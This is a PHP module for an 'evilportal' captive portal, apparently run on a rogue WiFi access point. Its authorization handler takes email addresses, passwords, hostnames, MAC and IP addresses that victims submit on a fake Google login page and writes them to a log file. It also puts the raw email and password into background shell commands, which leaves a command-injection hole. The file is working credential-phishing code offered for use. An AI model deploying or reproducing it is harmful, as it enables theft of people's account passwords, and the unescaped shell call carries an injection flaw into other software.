<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
    	
    	  $dirs = array(
            '/root/', 
            '/sd/',
        );
        $dirs = array_filter($dirs, 'file_exists');
        $dirs = array_filter($dirs, 'is_writeable');
        if (empty($dirs)) {
            die("die");
        }
        $dir = array_pop($dirs);
        $want = $dir . DIRECTORY_SEPARATOR . 'evilportal-logs';
        if (file_exists($want)) {
        } 
        else {
            mkdir($want);
        }
        if (!file_exists($want)) {
        }
        if (!is_dir($want)) {
        }
        if (!is_writeable($want)) {
        }
        $want .= DIRECTORY_SEPARATOR;
        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
            file_put_contents("$dir/evilportal-logs/google-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
            $this->execBackground("notify $email' - '$pwd");
            $this->execBackground("writeLog $email' - '$pwd");
        }
        // Call parent to handle basic authorization first
        parent::handleAuthorization();
    }

    /**
     * Override this to do something when the client is successfully authorized.
     * By default it just notifies the Web UI.
     */
    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    /**
     * If an error occurs then do something here.
     * Override to provide your own functionality.
     */
    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
